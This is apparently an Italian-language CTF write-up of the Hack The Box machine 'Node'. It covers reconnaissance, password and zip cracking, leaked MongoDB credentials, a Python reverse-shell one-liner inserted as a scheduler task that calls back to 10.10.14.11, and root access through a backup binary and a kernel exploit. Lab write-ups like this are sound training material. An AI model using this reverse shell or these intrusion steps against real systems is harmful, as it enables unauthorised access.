# Node

## Reconnaissance

Per prima cosa eseguo una scansione iniziale con nmap.

```text
sudo nmap -sC -sV -O -oA /usr/share/nmap/initial 10.10.10.58
```

* **-sC**: scipt nmap di default
* **-sV**: per rilevare la versione dei servizi
* **-O**: per rilevare il SO
* **-oA**: per stampare tutti i formati e salvarli nel file _nmap/initial_

Il risultato della scansione è il seguente:

```text
Nmap scan report for 10.10.10.58
Host is up (0.061s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE            VERSION
22/tcp   open  ssh                OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)
|   256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)
|_  256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519)
3000/tcp open  hadoop-tasktracker Apache Hadoop
| hadoop-tasktracker-info:
|_  Logs: /login
|_http-title: MyPlace
| hadoop-datanode-info:
|_  Logs: /login
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: HP P2000 G3 NAS device (91%), Linux 2.6.32 (89%), Android 4.1.1 (89%), Linux 3.10 - 4.11 (89%), Linux 3.12 (89%), Linux 3.13 (89%), Linux 3.13 or 4.2 (89%), Linux 3.16 (89%), Linux 3.16 - 4.6 (89%), Linux 3.18 (89%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeration

Innanzitutto, vedo cosa c'è sulla porta 3000:

<p align="center">
  <img src="/Immagini/Linux-Box/Node/node-1.png" />
</p>

Ispezionando la pagina sorgente trovo questo:

```text
<script type="text/javascript" src="vendor/jquery/jquery.min.js"></script>
<script type="text/javascript" src="vendor/bootstrap/js/bootstrap.min.js"></script>
<script type="text/javascript" src="vendor/angular/angular.min.js"></script>
<script type="text/javascript" src="vendor/angular/angular-route.min.js"></script>
<script type="text/javascript" src="assets/js/app/app.js"></script>
<script type="text/javascript" src="assets/js/app/controllers/home.js"></script>
<script type="text/javascript" src="assets/js/app/controllers/login.js"></script>
<script type="text/javascript" src="assets/js/app/controllers/admin.js"></script>
<script type="text/javascript" src="assets/js/app/controllers/profile.js"></script>
<script type="text/javascript" src="assets/js/misc/freelancer.min.js"></script>
```

La pagina http://10.10.10.58:3000/assets/js/app/controllers/home.js risulta essere interessante:

```text
var controllers = angular.module('controllers');

controllers.controller('HomeCtrl', function ($scope, $http) {
  $http.get('/api/users/latest').then(function (res) {
    $scope.users = res.data;
  });
});
```

Visito quindi la pagina http://10.10.10.58:3000/api/users/:

<p align="center">
  <img src="/Immagini/Linux-Box/Node/node-2.png" />
</p>

Provo ad utilizzare dei tool online per crackare le password:

<p align="center">
  <img src="/Immagini/Linux-Box/Node/node-3.png" />
</p>

Così scopro le seguenti password:
  * tom: **spongebob**
  * mark: **snowflake**
  * myP14ceAdm1nAcc0uNT: **manchester**

Provo ad entrare con l'account _myP14ceAdm1nAcc0uNT_:

<p align="center">
  <img src="/Immagini/Linux-Box/Node/node-4.png" />
</p>

Scarico il file di backup e provo a decodificarlo nel seguente modo:

```text
cat myplace.backup | base64 --decode > myplace-decoded.backup
```

Il risultato è un file zip protetto da una password. Provo ad utilizzare quindi il comando _fcrackzip_:

```text
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt myplace-decoded.backup
```

La password del file è **magicword**!

Dopo aver passato del tempo ad ispezionare i file ottenuti, scopro le credenziali dell'utente _mark_ nel file _app.js_:

```text
const url = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
```

## Exploitation

Provo ad accedere tramite ssh con le credeniali appena ottenute:

<p align="center">
  <img src="/Immagini/Linux-Box/Node/node-5.png" />
</p>

Sono dentro ma non ho i premessi per leggere il file user.txt. Quindi trasferisco il file _LinEnum.sh_ attraverso un server http ed avvio lo script.

Dal risultato della scansione emerge la presenza di mongodb sulla porta 27017. Provo quindi ad accedere al db utilizzando le credenziali dell'utente _mark_:

```text
mongo -u mark -p 5AYRft73VtFpc84k localhost:27017/scheduler
```
**Riesco ad accedere!**

Scopro che esiste una collezione chiamata scheduler e che posso aggiungere un task contenente una reverse shell:

```text
db.tasks.insert({cmd: "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.11\",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"})
```

Avvio quindi avvio un listener e ottengo la shell:

<p align="center">
  <img src="/Immagini/Linux-Box/Node/node-6.png" />
</p>

## Privilege Escalation

Ora bisogna capire come diventare root.

Lanciando il comando _id_ ottengo il seguente output:

```text
uid=1000(tom) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),116(sambashare),1002(admin)
```

Quindi ritorno sul risultato dello script _LinEnum_ e scopro che c'è un file che potrebbe essere sfruttato, ovvero _/bin/usr/bin/backup_. Inoltre, all'interno del file _/var/www/myplace/app.js_ scopro delle informazioni interessanti:

```text
[...]
const backup_key  = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d023016710
4d474';
[...]
app.get('/api/admin/backup', function (req, res) {
    if (req.session.user && req.session.user.is_admin) {
      var proc = spawn('/usr/local/bin/backup', ['-q', backup_key, __dirname ]);
[...]
```

La prima è la chiave _backup_key_ e la seconda è il modo attraverso il quale è possibile lanciare il file backup.

Provo quindi ad eseguire questo comando:

```text
/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /tmp > backup_test.txt
```

Il risultato è una stringa in base 64, quindi provo a fare la decodifica:

```text
cat backup_test.txt | base64 --decode > backup_test_decoded.txt
```

Ottengo un file zip e provo ad estrarne il contenuto:

```text
Archive:  test-decoded
   creating: tmp/
   creating: tmp/systemd-private-668dc95e5f5945b897532b0ae5e207b1-systemd-timesyncd.service-CwnioT/
   creating: tmp/systemd-private-668dc95e5f5945b897532b0ae5e207b1-systemd-timesyncd.service-CwnioT/tmp/
[test-decoded] tmp/test password:
 extracting: tmp/test                
   creating: tmp/.Test-unix/
  inflating: tmp/LinEnum.sh          
   creating: tmp/.XIM-unix/
   creating: tmp/vmware-root/
   creating: tmp/.X11-unix/
   creating: tmp/.ICE-unix/
   creating: tmp/.font-unix/
  inflating: tmp/pspy64
```

Provo ad effettuare la decodifica:

```text
/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /root > backup_root.txt
```

```text
cat backup_root.txt | base64 --decode > backup_root_decoded.txt
```

Passo il file sulla mia macchina e utilizzo _7z_, ottenendo questo:

<p align="center">
  <img src="/Immagini/Linux-Box/Node/node-7.png" />
</p>

<p align="center">
  .........................................................................
</p>

Prima di andare avanti su questa strada provo a fare un check sulla versione del kernel in uso e scopro, tramite _searchsploit_, che è vulnerabile ed è possibile effettuare privilage escalation.

Scarico il file e lo trasferisco alla macchina node. Seguo i passaggi e divento root!

<p align="center">
  <img src="/Immagini/Linux-Box/Node/node-8.png" />
</p>
